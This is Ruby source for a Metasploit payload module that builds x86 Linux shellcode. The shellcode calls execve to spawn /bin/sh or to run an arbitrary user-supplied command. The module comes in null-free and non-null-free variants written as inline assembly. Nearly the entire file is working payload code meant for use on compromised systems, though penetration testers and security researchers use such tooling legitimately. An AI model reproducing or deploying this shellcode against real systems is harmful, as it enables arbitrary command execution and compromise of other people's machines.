##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module MetasploitModule

  CachedSize = 43

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => 'Execute an arbitrary command or just a /bin/sh shell',
      'Author'        => ['vlad902',
                          'Geyslan G. Bem <geyslan[at]gmail.com>'],
      'License'       => MSF_LICENSE,
      'References'    => [ ['URL', 'https://github.com/geyslan/SLAE/blob/master/4th.assignment/tiny_execve_sh.asm'],
                           ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/x86_execve_dyn.asm'] ],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86
    ))

    # Register exec options
    register_options(
      [
        OptString.new('CMD',  [ false,  "The command string to execute" ]),
      ])
    register_advanced_options(
      [
        OptBool.new('NullFreeVersion', [ true, "Null-free shellcode version", false ])
      ])
  end

  def generate_stage(opts={})
    cmd             = datastore['CMD'] || ''
    nullfreeversion = datastore['NullFreeVersion']
    if cmd.empty?
      #
      # Builds the exec payload which executes a /bin/sh shell.
      # execve("/bin/sh", NULL, NULL)
      #
      if nullfreeversion
        # 21 bytes (null-free)
        payload = <<-EOS
            xor ecx, ecx     ; ecx = NULL
            mul ecx          ; eax and edx = NULL
            mov al, 0xb      ; execve syscall
            push ecx         ; string '\0'
            push 0x68732f2f  ; "//sh"
            push 0x6e69622f  ; "/bin"
            mov ebx, esp     ; pointer to "/bin//sh\0" cmd
            int 0x80         ; bingo
        EOS
      else
        # 20 bytes (not null-free)
        payload = <<-EOS
            xor ecx, ecx     ; ecx = NULL
            mul ecx          ; eax and edx = NULL
            mov al, 0xb      ; execve syscall
            push 0x0068732f  ; "/sh\0"
            push 0x6e69622f  ; "/bin"
            mov ebx, esp     ; pointer to "/bin/sh\0" cmd
            int 0x80         ; bingo
        EOS
      end
    else
      #
      # Dynamically builds the exec payload based on the user's options.
      # execve("/bin/sh", ["/bin/sh", "-c", "CMD"], NULL)
      #
      pushw_c_opt = "dd 0x632d6866" # pushw 0x632d (metasm doesn't support pushw)
      if nullfreeversion
        if cmd.length > 0xffff
          raise RangeError, "CMD length has to be smaller than %d" % 0xffff, caller()
        end
        if cmd.length <= 0xff # 255
          breg = "bl"
        else
          breg = "bx"
          if (cmd.length & 0xff) == 0 # let's avoid zeroed bytes
            cmd += " "
          end
        end
        mov_cmd_len_to_breg = "mov #{breg}, #{cmd.length}"
        # 47/49 bytes without cmd (null-free)
        payload  = <<-EOS
            xor ebx, ebx
            mul ebx
            mov al, 0xb
            push edx
            #{pushw_c_opt}         ; "-c"
            mov edi, esp
            jmp tocall             ; jmp/call/pop cmd address
          afterjmp:
            pop esi                ; pop cmd address into esi
            #{mov_cmd_len_to_breg} ; mov (byte/word) (bl/bx), cmd.length
            mov [esi+ebx], dl      ; NUL '\0' terminate cmd
            push edx
            push 0x68732f2f        ; "//sh"
            push 0x6e69622f        ; "/bin"
            mov ebx, esp
            push edx
            push esi
            push edi
            push ebx
            mov ecx, esp
            int 0x80
          tocall:
            call afterjmp          ; call/pop cmd address
            db "#{cmd}"
        EOS
      else
        # 36 bytes without cmd (not null-free)
        payload = <<-EOS
            push 0xb
            pop eax
            cdq
            push edx
            #{pushw_c_opt}   ; "-c"
            mov edi, esp
            push 0x0068732f  ; "/sh\0"
            push 0x6e69622f  ; "/bin"
            mov ebx, esp
            push edx
            call continue
            db "#{cmd}", 0x00
          continue:
            push edi
            push ebx
            mov ecx, esp
            int 0x80
        EOS
      end
    end
    Metasm::Shellcode.assemble(Metasm::Ia32.new, payload).encode_string
  end
end
